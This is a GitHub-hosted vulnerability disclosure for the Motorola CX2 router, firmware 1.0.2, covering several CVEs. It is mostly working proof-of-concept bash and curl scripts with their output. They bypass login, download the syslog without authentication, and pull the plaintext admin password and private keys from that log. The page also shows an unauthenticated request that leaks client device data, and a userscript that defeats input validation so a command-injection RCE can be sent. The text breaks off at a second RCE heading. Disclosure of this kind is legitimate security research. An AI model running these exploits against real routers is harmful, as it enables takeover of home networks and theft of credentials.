=== Content from github.com_863e139f_20250119_115029.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fcc-crack%2Frouter%2Fblob%2Fmaster%2Fmotocx2.md)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fcc-crack%2Frouter%2Fblob%2Fmaster%2Fmotocx2.md)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=cc-crack%2Frouter)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[cc-crack](/cc-crack)
/
**[router](/cc-crack/router)**
Public

* [Notifications](/login?return_to=%2Fcc-crack%2Frouter) You must be signed in to change notification settings
* [Fork
  3](/login?return_to=%2Fcc-crack%2Frouter)
* [Star
   4](/login?return_to=%2Fcc-crack%2Frouter)

* [Code](/cc-crack/router)
* [Issues
  0](/cc-crack/router/issues)
* [Pull requests
  0](/cc-crack/router/pulls)
* [Actions](/cc-crack/router/actions)
* [Projects
  0](/cc-crack/router/projects)
* [Security](/cc-crack/router/security)
* [Insights](/cc-crack/router/pulse)

Additional navigation options

* [Code](/cc-crack/router)
* [Issues](/cc-crack/router/issues)
* [Pull requests](/cc-crack/router/pulls)
* [Actions](/cc-crack/router/actions)
* [Projects](/cc-crack/router/projects)
* [Security](/cc-crack/router/security)
* [Insights](/cc-crack/router/pulse)

## Files

 master
## Breadcrumbs

1. [router](/cc-crack/router/tree/master)
/
# motocx2.md

Copy path Blame  Blame
## Latest commit

## History

[History](/cc-crack/router/commits/master/motocx2.md)355 lines (297 loc) · 22.3 KB master
## Breadcrumbs

1. [router](/cc-crack/router/tree/master)
/
# motocx2.md

Top
## File metadata and controls

* Preview
* Code
* Blame

355 lines (297 loc) · 22.3 KB[Raw](https://github.com/cc-crack/router/raw/refs/heads/master/motocx2.md)
# Motorola CX2 router vulnerabilities

CVE-2020-21937

CVE-2020-21936

CVE-2020-21935

CVE-2020-21934

CVE-2020-21933

CVE-2020-21932

## Description

This router is a Motorola brand sale by Soplar.
More information could be found here.
<https://cn.motorolanetwork.com/cx2.html>

<http://www.soplar.cn/moluyou.html>

## Version

CX 1.0.2 Build 20190508 Rel.97360n

## Reporter

cc-crack

## Vulnerabilities

All env variables referenced in POC code defined as:

```
HOST='Host: 192.168.51.1'
Origin='Origin: http://192.168.51.1'
HNAP_AUTH='HNAP_AUTH: '
CT='Content-Type: application/json; charset=UTF-8'
XR='X-Requested-With: XMLHttpRequest'
ACCEPT='Accept: application/json, text/javascript, */*; q=0.01'
SOAP_ACTION_HEAD='SOAPAction: "http://purenetworks.com/HNAP1/Login"'
Referer='Referer: http://192.168.51.1/Login.html'
DEFAULT_COOKIE='Cookie: work_mode=router; timeout=170; uid=; PrivateKey='
PRAGMA='Pragma: no-cache'
REQUEST_LOGIN_DATA='{"Login":{"Action":"request","Username":"Admin","LoginPassword":"","Captcha":"","PrivateLogin":"LoginPassword"}}'
LOGIN_DATA='{"Login":{"Action":"login","Username":"Admin","LoginPassword":"","Captcha":"","PrivateLogin":"LoginPassword"}}'
COOKIE=$DEFAULT_COOKIE
TIME_STAMPE=""
HNAP_AUTH_POST=""
```

Some of them maybe are useless, they just are a part of some other test code.

1. Login could be bypassed

   **Description**:

   An issue was discovered in Moto route CX2 1.0.2. The login could be bypassed to get a partially authorized token and uid.

   **Reproduce**:

   You should install jq first. eg: `sudo apt install jq`

   ```
       #login
   function Login
   {
           c=$(curl -s -H $HOST -H $Origin -H $HNAP_AUTH -H 'SOAPAction: "http://purenetworks.com/HNAP1/Login"' -H 'Referer: http://192.168.51.1/Login.html'  -H $DEFAULT_COOKIE  --data-binary $REQUEST_LOGIN_DATA --compressed 'http://192.168.51.1/HNAP1/' > out.txt && cat out.txt | jq .LoginResponse.Cookie)
           uid=${c:1:8}
           setCooikeUID $uid
           echo $COOKIE
           curl -H $HOST -H $Origin -H $HNAP_AUTH -H 'SOAPAction: "http://purenetworks.com/HNAP1/Login"' -H 'Referer: http://192.168.51.1/Login.html' -H $COOKIE --data-binary $LOGIN_DATA --compressed 'http://192.168.51.1/HNAP1/'
   }
   Login
   echo '\n'
   ```

   ```
   ╰─○ ./poc.sh
   Cookie: work_mode=router; timeout=170; uid=WA9rYkub; PrivateKey=

   { "LoginResponse": { "LoginResult": "OK" } }
   ```
2. /HNAP1/GetDownLoadSyslog authentication bypass

   **Description**:

   An issue was discovered in Moto route CX2 1.0.2. The authentication of Syslog download could be bypassed.

   **Reproduce**:

   ```
       function getLog
   {
       curl -s -H $HOST -H $Origin \
       -H 'Upgrade-Insecure-Requests: 1' \
       -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3' \
       -H 'Referer: http://192.168.51.1/Diagnosis.html' \
       -H 'Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7' \
       -H $COOKIE -H 'Pragma: no-cache' -H 'Cache-Control: no-cache' \
       --data "" \
       --compressed 'http://192.168.51.1/HNAP1/prog.fcgi?method=/HNAP1/GetDownLoadSyslog' > $1
   }
   Login
   echo '\n'
   getLog log.tar.gz
   ls -al log.tar.gz
   ```

   ```
   ╰─○ ./poc.sh
   Cookie: work_mode=router; timeout=170; uid=MVS/fLm8; PrivateKey=

   { "LoginResponse": { "LoginResult": "OK" } }

   -rw-r--r--  1 *******  staff  30168 Jul  1 08:18 log.tar.gz
   ```
3. Plain text password and Private key exist in the log file

   **Description**:

   An issue was discovered in Moto route CX2 1.0.2. The Admin password and the private key could be found in the log tar package which could download from router.

   **Reproduce**:

   ```
     function checkPlainPassword
   {
       zgrep -a password $1
       zgrep -a key $1
       zgrep -a cipher $1
   }

   Login
   echo '\n'
   getLog log.tar.gz
   ls -al log.tar.gz
   checkPlainPassword log.tar.gz
   ```

   ```
   ╰─○ ./poc.sh
   Cookie: work_mode=router; timeout=170; uid=tuCPveI1; PrivateKey=

   { "LoginResponse": { "LoginResult": "OK" } }

   -rw-r--r--  1 *******  staff  33516 Jul  1 08:26 log.tar.gz
   Jun 22 08:43:41 OpenWrt local5.info prog-cgi[1352]: [Management] Changing login password
   Jun 24 18:05:15 OpenWrt local5.info prog-cgi[1382]: [Management] Changing login password
   Jun 24 18:47:38 OpenWrt local5.info prog-cgi[1382]: [Management] Changing login password
   Jun 24 18:05:15 OpenWrt local0.debug prog-cgi[1382]: modules/management.c:SetPasswdSettings:1506:query:{"SetPasswdSettings":{"system_root_password":"d139a32b6c3c3e606540fb1f727f1172e2c7a32bb53c3e1e6540a237727cb872e2c7a32bb53c3e1e6540a237727cb872e2c7a32bb53c3e1e6540a23772
   Jun 24 18:47:38 OpenWrt local0.debug prog-cgi[1382]: modules/management.c:CheckPasswdSettings:1554:query:{"CheckPasswdSettings":{"system_root_password":"76c7bad3fd9ab2b0784e29d9ed02b5e64d39bad3b39ab297784e96deed6362e64d39bad3b39ab297784e96deed6362e64d39bad3b39ab297784e96
   Jun 24 18:47:38 OpenWrt local0.debug prog-cgi[1382]: modules/management.c:SetPasswdSettings:1506:query:{"SetPasswdSettings":{"system_root_password":"c734d3d377b1da4295f84a4b7b4587144d39bad3b39ab297784e96deed6362e64d39bad3b39ab297784e96deed6362e64d39bad3b39ab297784e96deed
   Jun 24 17:46:33 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:641:key:BUc0Gfvupo4X62H0ASoYThisIsAPlainPWD1,challenge:nGoIBN1rpVQDxStUxO74
   Jun 24 17:46:33 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:642:privatekey_buf:3B011AE9D2319AB2BC6D711E1E72D10B
   Jun 24 17:46:33 OpenWrt local0.debug prog-cgi[1382]: security.c:AUTH_ResponseHandler:2764:publickey:BUc0Gfvupo4X62H0ASoY
   Jun 24 17:46:33 OpenWrt local0.debug prog-cgi[1382]: security.c:AUTH_ResponseHandler:2766:publickey:BUc0Gfvupo4X62H0ASoY
   Jun 24 17:57:12 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:641:key:itciZG60noEYbkQaUFlaThisIsAPlainPWD1,challenge:5FgQIbPNWXtwU42z7DIW
   Jun 24 17:57:12 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:642:privatekey_buf:799DC71A8181A52E0DBBE2E39C85085F
   Jun 24 17:57:12 OpenWrt local0.debug prog-cgi[1382]: security.c:AUTH_ResponseHandler:2764:publickey:itciZG60noEYbkQaUFla
   Jun 24 17:57:12 OpenWrt local0.debug prog-cgi[1382]: security.c:AUTH_ResponseHandler:2766:publickey:itciZG60noEYbkQaUFla
   Jun 24 18:03:52 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:641:key:Ull6GghC8VTbTq40ZHNoThisIsAPlainPWD1,challenge:vvjmI2JW9UmYwRJdkbYB
   Jun 24 18:03:52 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:642:privatekey_buf:36A275799C92F7B311E01BF576517A5C
   Jun 24 18:03:52 OpenWrt local0.debug prog-cgi[1382]: security.c:AUTH_ResponseHandler:2764:publickey:Ull6GghC8VTbTq40ZHNo
   Jun 24 18:03:52 OpenWrt local0.debug prog-cgi[1382]: security.c:AUTH_ResponseHandler:2766:publickey:Ull6GghC8VTbTq40ZHNo
   Jun 24 18:05:15 OpenWrt local0.debug prog-cgi[1382]: security.c:safe_free_NODE:1272:publickey:BUc0Gfvupo4X62H0ASoY
   Jun 24 18:05:15 OpenWrt local0.debug prog-cgi[1382]: security.c:safe_free_NODE:1273:privatekey:3B011AE9D2319AB2BC6D711E1E72D10B
   Jun 24 18:05:19 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:641:key:RB9IFIIg364kYw6uhaqaThisIsAPlainPWD,challenge:hT1Mc3tBr2Z5NjvnmAo7
   Jun 24 18:05:19 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:642:privatekey_buf:D46691831DB0DE88CC198097055BDA33
   Jun 24 18:05:19 OpenWrt local0.debug prog-cgi[1382]: security.c:AUTH_ResponseHandler:2764:publickey:RB9IFIIg364kYw6uhaqa
   Jun 24 18:05:19 OpenWrt local0.debug prog-cgi[1382]: security.c:AUTH_ResponseHandler:2766:publickey:RB9IFIIg364kYw6uhaqa
   Jun 24 18:05:35 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:641:key:o/t5PqsZc7CFH19RaiTJThisIsAPlainPWD,challenge:llM58p29REvF3l/FwsbN
   Jun 24 18:05:35 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:642:privatekey_buf:2EF1CC5A66D79D3A228B3CCCF0B2A88F
   Jun 24 18:05:35 OpenWrt local0.debug prog-cgi[1382]: security.c:AUTH_ResponseHandler:2764:publickey:o/t5PqsZc7CFH19RaiTJ
   Jun 24 18:05:35 OpenWrt local0.debug prog-cgi[1382]: security.c:AUTH_ResponseHandler:2766:publickey:o/t5PqsZc7CFH19RaiTJ
   Jun 24 18:12:16 OpenWrt local0.debug prog-cgi[1382]: security.c:safe_free_NODE:1272:publickey:itciZG60noEYbkQaUFla
   Jun 24 18:12:16 OpenWrt local0.debug prog-cgi[1382]: security.c:safe_free_NODE:1273:privatekey:799DC71A8181A52E0DBBE2E39C85085F
   Jun 24 18:19:07 OpenWrt local0.debug prog-cgi[1382]: security.c:safe_free_NODE:1272:publickey:Ull6GghC8VTbTq40ZHNo
   Jun 24 18:19:07 OpenWrt local0.debug prog-cgi[1382]: security.c:safe_free_NODE:1273:privatekey:36A275799C92F7B311E01BF576517A5C
   Jun 24 18:20:21 OpenWrt local0.debug prog-cgi[1382]: security.c:safe_free_NODE:1272:publickey:RB9IFIIg364kYw6uhaqa
   Jun 24 18:20:21 OpenWrt local0.debug prog-cgi[1382]: security.c:safe_free_NODE:1273:privatekey:D46691831DB0DE88CC198097055BDA33
   Jun 24 18:23:03 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:641:key:LO6LPeH0qkHht8o+JgBYThisIsAPlainPWD,challenge:+zj7TNy2B3ntMvrq/d5c
   Jun 24 18:23:03 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:642:privatekey_buf:D71E06255E5A26C22A65BC881FCCEEBA
   Jun 24 18:23:03 OpenWrt local0.debug prog-cgi[1382]: security.c:AUTH_ResponseHandler:2764:publickey:LO6LPeH0qkHht8o+JgBY
   Jun 24 18:23:03 OpenWrt local0.debug prog-cgi[1382]: security.c:AUTH_ResponseHandler:2766:publickey:LO6LPeH0qkHht8o+JgBY
   Jun 24 18:23:03 OpenWrt local0.debug prog-cgi[1382]: security.c:safe_free_NODE:1272:publickey:o/t5PqsZc7CFH19RaiTJ
   Jun 24 18:23:03 OpenWrt local0.debug prog-cgi[1382]: security.c:safe_free_NODE:1273:privatekey:2EF1CC5A66D79D3A228B3CCCF0B2A88F
   Jun 24 18:30:01 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:641:key:MaFu3VbiMk5DVOCrdDGPThisIsAPlainPWD,challenge:+ZXL3PEzRDfHKXvHZ9OI
   Jun 24 18:30:01 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:642:privatekey_buf:54BB74CD7DC276242EAA6763327BC543
   Jun 24 18:30:01 OpenWrt local0.debug prog-cgi[1382]: security.c:AUTH_ResponseHandler:2764:publickey:MaFu3VbiMk5DVOCrdDGP
   Jun 24 18:30:01 OpenWrt local0.debug prog-cgi[1382]: security.c:AUTH_ResponseHandler:2766:publickey:MaFu3VbiMk5DVOCrdDGP
   Jun 24 18:30:16 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:641:key:P4m26q6ot+NCaUHyS/o0ThisIsAPlainPWD,challenge:R2NJKpaugV46y/JDUaOC
   Jun 24 18:30:16 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:642:privatekey_buf:F2CFA5FAB1BB395A7CFB7B21F741758F
   Jun 24 18:30:16 OpenWrt local0.debug prog-cgi[1382]: security.c:AUTH_ResponseHandler:2764:publickey:P4m26q6ot+NCaUHyS/o0
   Jun 24 18:30:16 OpenWrt local0.debug prog-cgi[1382]: security.c:AUTH_ResponseHandler:2766:publickey:P4m26q6ot+NCaUHyS/o0
   Jun 24 18:30:28 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:641:key:OVsXJVQTjGzQ1sZD8QDvThisIsAPlainPWD,challenge:OE0w522nsn4DaQExFZxg
   Jun 24 18:30:28 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:642:privatekey_buf:C03AD43494AEBCDF60FEE04B85CD9370
   Jun 24 18:30:28 OpenWrt local0.debug prog-cgi[1382]: security.c:AUTH_ResponseHandler:2764:publickey:OVsXJVQTjGzQ1sZD8QDv
   Jun 24 18:30:28 OpenWrt local0.debug prog-cgi[1382]: security.c:AUTH_ResponseHandler:2766:publickey:OVsXJVQTjGzQ1sZD8QDv
   Jun 24 18:32:09 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:641:key:lUuoCMB0eFB+EPcwWGu2ThisIsAPlainPWD,challenge:RUDDgwrOZEX7dA3+Saso
   Jun 24 18:32:09 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:642:privatekey_buf:00CCA8E72DD21BAED65E6A0FA39DF1FF
   Jun 24 18:32:09 OpenWrt local0.debug prog-cgi[1382]: security.c:AUTH_ResponseHandler:2764:publickey:lUuoCMB0eFB+EPcwWGu2
   Jun 24 18:32:09 OpenWrt local0.debug prog-cgi[1382]: security.c:AUTH_ResponseHandler:2766:publickey:lUuoCMB0eFB+EPcwWGu2
   Jun 24 18:39:45 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:641:key:uHWjy/Ys2HDRq6jKrTRLThisIsAPlainPWD,challenge:homSb7E24Aec76z9ls2L
   Jun 24 18:39:45 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:642:privatekey_buf:79D30570F08507DB08CFBB087FD7BD0B
   Jun 24 18:39:45 OpenWrt local0.debug prog-cgi[1382]: security.c:AUTH_ResponseHandler:2764:publickey:uHWjy/Ys2HDRq6jKrTRL
   Jun 24 18:39:45 OpenWrt local0.debug prog-cgi[1382]: security.c:AUTH_ResponseHandler:2766:publickey:uHWjy/Ys2HDRq6jKrTRL
   Jun 24 18:39:45 OpenWrt local0.debug prog-cgi[1382]: security.c:safe_free_NODE:1272:publickey:LO6LPeH0qkHht8o+JgBY
   Jun 24 18:39:45 OpenWrt local0.debug prog-cgi[1382]: security.c:safe_free_NODE:1273:privatekey:D71E06255E5A26C22A65BC881FCCEEBA
   Jun 24 18:46:40 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:641:key:GVH1s7hqhun2w3WbV1jWThisIsAPlainPWD,challenge:4qwIQ99dMHPyJWMhlsK6
   Jun 24 18:46:40 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:642:privatekey_buf:650035854B5BAB9CC137C0F553B63EA9
   Jun 24 18:46:40 OpenWrt local0.debug prog-cgi[1382]: security.c:AUTH_ResponseHandler:2764:publickey:GVH1s7hqhun2w3WbV1jW
   Jun 24 18:46:40 OpenWrt local0.debug prog-cgi[1382]: security.c:AUTH_ResponseHandler:2766:publickey:GVH1s7hqhun2w3WbV1jW
   Jun 24 18:46:40 OpenWrt local0.debug prog-cgi[1382]: security.c:safe_free_NODE:1272:publickey:MaFu3VbiMk5DVOCrdDGP
   Jun 24 18:46:40 OpenWrt local0.debug prog-cgi[1382]: security.c:safe_free_NODE:1273:privatekey:54BB74CD7DC276242EAA6763327BC543
   Jun 24 18:46:40 OpenWrt local0.debug prog-cgi[1382]: security.c:safe_free_NODE:1272:publickey:P4m26q6ot+NCaUHyS/o0
   Jun 24 18:46:40 OpenWrt local0.debug prog-cgi[1382]: security.c:safe_free_NODE:1273:privatekey:F2CFA5FAB1BB395A7CFB7B21F741758F
   Jun 24 18:46:40 OpenWrt local0.debug prog-cgi[1382]: security.c:safe_free_NODE:1272:publickey:OVsXJVQTjGzQ1sZD8QDv
   Jun 24 18:46:40 OpenWrt local0.debug prog-cgi[1382]: security.c:safe_free_NODE:1273:privatekey:C03AD43494AEBCDF60FEE04B85CD9370
   Jun 24 18:47:38 OpenWrt local0.debug prog-cgi[1382]: security.c:safe_free_NODE:1272:publickey:lUuoCMB0eFB+EPcwWGu2
   Jun 24 18:47:38 OpenWrt local0.debug prog-cgi[1382]: security.c:safe_free_NODE:1273:privatekey:00CCA8E72DD21BAED65E6A0FA39DF1FF
   Jun 24 18:47:38 OpenWrt local0.debug prog-cgi[1382]: security.c:safe_free_NODE:1272:publickey:GVH1s7hqhun2w3WbV1jW
   Jun 24 18:47:38 OpenWrt local0.debug prog-cgi[1382]: security.c:safe_free_NODE:1273:privatekey:650035854B5BAB9CC137C0F553B63EA9
   Jun 24 18:47:43 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:641:key:Oj/0G/EUmcyTSF1TOWswThisIsAPlainPWD,challenge:7ikeZOGlrnYLCYh0PGIx
   Jun 24 18:47:43 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:642:privatekey_buf:B00B2523A61FDB5F8C1BF157C14ADAA1
   Jun 24 18:47:43 OpenWrt local0.debug prog-cgi[1382]: security.c:AUTH_ResponseHandler:2764:publickey:Oj/0G/EUmcyTSF1TOWsw
   Jun 24 18:47:43 OpenWrt local0.debug prog-cgi[1382]: security.c:AUTH_ResponseHandler:2766:publickey:Oj/0G/EUmcyTSF1TOWsw
   Jun 24 15:45:20 OpenWrt kern.warn kernel: [   32.212000] wtc_acquire_groupkey_wcid: Found a non-occupied wtbl_idx:125 for WDEV_TYPE:1
   Jun 24 15:45:25 OpenWrt kern.warn kernel: [   36.860000] wtc_acquire_groupkey_wcid: Found a non-occupied wtbl_idx:124 for WDEV_TYPE:1
   Jun 24 17:46:33 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:640:cipher:ThisIsAPlainPWD1
   Jun 24 17:57:12 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:640:cipher:ThisIsAPlainPWD1
   Jun 24 18:03:52 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:640:cipher:ThisIsAPlainPWD1
   Jun 24 18:05:19 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:640:cipher:ThisIsAPlainPWD
   Jun 24 18:05:35 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:640:cipher:ThisIsAPlainPWD
   Jun 24 18:23:03 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:640:cipher:ThisIsAPlainPWD
   Jun 24 18:30:01 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:640:cipher:ThisIsAPlainPWD
   Jun 24 18:30:16 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:640:cipher:ThisIsAPlainPWD
   Jun 24 18:30:28 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:640:cipher:ThisIsAPlainPWD
   Jun 24 18:32:09 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:640:cipher:ThisIsAPlainPWD
   Jun 24 18:39:45 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:640:cipher:ThisIsAPlainPWD
   Jun 24 18:46:40 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:640:cipher:ThisIsAPlainPWD
   Jun 24 18:47:43 OpenWrt local0.debug prog-cgi[1382]: security.c:websGenPrivateKey:640:cipher:ThisIsAPlainPWD
   ```

   As you can see the cipher filed is the admin password in plain text. There are private keys logged in hex string as well.
4. GetStationSettings, GetWebsiteFilterSettings and GetNetworkSettings could be accessed unauthenticated via HNAP1/GetMultipleHNAPs

   **Description**:

   HNAP1/GetMultipleHNAPs could be accessed unauthenticated but to some methods that lead to the information leakage.
   I notice that HNAP1/GetMultipleHNAPs maybe designed to allow unauthenticated access. But there is the sensitive information returned by some method. Like the following result, the parent\_control\_rule should not be obtained in this case.
   All of HNAP1/GetMultipleHNAPs access should be authenticated.

   **Reproduce**:

   ```
   function getRouterBasicInfo
   {
       curl -H $HOST \
       -H 'Accept: application/json' \
       -H $Origin -H 'SOAPACTION: "http://purenetworks.com/HNAP1/GetMultipleHNAPs"' \
       -H 'Content-Type: application/json' -H 'Referer: http://192.168.51.1/Home.html' -H 'Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7' \
       -H 'Pragma: no-cache' \
       -H 'Cache-Control: no-cache' \
       --data-binary '{"GetMultipleHNAPs":{"GetStationSettings":"","GetWebsiteFilterSettings":"","GetNetworkSettings":""}}' \
       --compressed 'http://192.168.51.1/HNAP1/'
   }
   getRouterBasicInfo
   ```

   ```
   {
   "GetMultipleHNAPsResponse": {
       "GetStationSettingsResponse": {
           "wire_sta_list": "00:3e:e1:c4:ff:95,192.168.51.143,tester,2019-06-24 20:06:16,615,0,Apple  Inc.",
           "wireless_sta_2g_list": "",
           "wireless_sta_2g_guest_list": "",
           "wireless_sta_5g_list": "",
           "wireless_sta_5g_guest_list": "",
           "offline_sta_list": "00:e0:4c:6c:27:6b,192.168.51.195,MacBook-Pro,2019-06-06 13:52:18,,0,null;a0:99:9b:0e:b8:b9,192.168.51.215,securisecs-MBP,2017-09-08 18:21:17,,1,Apple  Inc.;f0:18:98:39:d1:2a,192.168.51.240,MacBook-Pro,2019-06-24 15:44:02,,2,null;f4:cb:52:95:7f:82,192.168.51.222,192.168.51.222,2019-05-30 20:55:35,,1,HUAWEI TECHNOLOGIES CO. LTD;80:e6:50:0e:09:ea,192.168.51.140,*******s-MacPro,2019-06-03 07:23:15,,2,Apple  Inc.;50:64:2b:0f:a7:f2,192.168.51.100,192.168.51.100,2019-06-03 07:58:35,,0,XIAOMI Electronics CO. LT;68:8f:84:05:a1:f5,192.168.51.137,192.168.51.137,2019-06-03 07:58:36,,0,HUAWEI TECHNOLOGIES CO. LTD;00:3e:e1:c3:74:80,192.168.51.168,*******dePro,2019-06-06 19:10:38,,0,Apple  Inc.;00:3e:e1:c4:ff:94,192.168.51.142,*******MacPro,2019-06-09 14:39:38,,0,Apple  Inc.;b8:63:4d:23:2c:f6,192.168.51.200,*******-Main,2019-06-20 19:36:58,,2,Apple  Inc.",
           "wireless_maclist_mode": "ojbk",
           "wireless_maclist": "123,123123123",
           "GetStationSettingsResult": "OK"
       },
       "GetWebsiteFilterSettingsResponse": {
           "parent_control_rule": "1,,a0:99:9b:0e:b8:b9,1,testtest.org,00:00:00,23:59:00,Mon",
           "GetWebsiteFilterSettingsResult": "OK"
       },
       "GetNetworkSettingsResponse": {
           "lan(0)_mac": "E4:90:7E:F8:38:F4",
           "lan(0)_ipaddr": "192.168.51.1",
           "lan(0)_netmask": "255.255.255.0",
           "lan(0)_dhcps_enable": "1",
           "lan(0)_dhcps_start": "100",
           "lan(0)_dhcps_end": "249",
           "lan(0)_dhcps_lease": "1440m",
           "GetNetworkSettingsResult": "OK"
       },
       "GetMultipleHNAPsResult": "OK"
       }
   }
   ```
5. HNAP1/GetNetworkTomographySettings RCE

   **Description**

   An issue was discovered in Moto route CX2 1.0.2. An attacker could perform a command injection to execute arbitrary system command on the router by HNAP1/GetNetworkTomographySettings.

   **Reproduce**

   1. Login first
   2. Bypass browser side input validation. I just use Tampermonkey to inject a piece of JS code while accessing Diagnosis. Or you can free to use any proxy tools like burp.

      ```
      // ==UserScript==
      // @name         New Userscript
      // @namespace    http://tampermonkey.net/
      // @version      0.1
      // @description  try to take over the world!
      // @author       You
      // @match        http://192.168.51.1/Diagnosis.html
      // @grant        none
      // ==/UserScript==
      (function() {
          'use strict';
          verifyDiagnisInput = function(){
              return true;
          }
      })();
      ```
   3. submit command
      [![ ](https://camo.githubusercontent.com/f283a3c16ddc742c8aee6df908a84c34bf8a5e9f3297d9b40f044ebbf5e020f2/687474703a2f2f306437643032656363653234636534636533363566656537396336346131623633396238393465322e6f73732d636e2d71696e6764616f2e616c6979756e63732e636f6d2f353833393739643434306664346135616363346265663431313635336334663631633533656539382e6a7067)](https://camo.githubusercontent.com/f283a3c16ddc742c8aee6df908a84c34bf8a5e9f3297d9b40f044ebbf5e020f2/687474703a2f2f306437643032656363653234636534636533363566656537396336346131623633396238393465322e6f73732d636e2d71696e6764616f2e616c6979756e63732e636f6d2f353833393739643434306664346135616363346265663431313635336334663631633533656539382e6a7067)
6. HNAP1/SetWLanApcliSettings RCE

   **Description**

